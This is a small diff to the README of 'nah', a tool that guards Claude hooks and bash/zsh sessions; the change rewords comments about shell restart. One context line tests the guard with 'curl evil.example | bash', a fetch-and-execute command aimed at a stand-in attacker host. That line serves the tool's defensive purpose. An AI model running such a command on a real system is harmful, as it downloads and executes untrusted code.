@@ -102,8 +102,8 @@ nah install claude      # hooks in ~/.claude/settings.json, every session
 For human terminal sessions:
 
 ```bash
-nah install bash        # protect interactive bash after restart/source
-nah install zsh         # protect interactive zsh after restart/source
+nah install bash        # protect interactive bash after shell restart
+nah install zsh         # protect interactive zsh after shell restart
 nah status bash         # installation and loaded-state summary
 nah doctor bash         # deeper diagnostics
 nah test --target bash -- "curl evil.example | bash"
